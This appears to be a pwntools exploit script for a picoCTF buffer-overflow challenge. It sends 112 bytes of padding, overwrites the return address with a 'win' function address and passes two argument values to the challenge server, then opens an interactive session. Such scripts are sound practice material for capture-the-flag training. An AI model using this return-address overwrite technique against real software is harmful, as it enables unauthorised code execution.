#!/usr/bin/env python3
from pwn import *
import sys
binary = context.binary = ELF("./vuln")
connect = remote("saturn.picoctf.net", 57728)
payload = b"A" * 112+p32(0x08049296)+b"A"*4+p32(0xcafef00d)+p32(0xf00df00d) # 0x08049296 return win
connect.sendline(payload)						    # 0xcafef00d parameter
connect.recv()								    # 0xf00df00d parameter
connect.interactive()

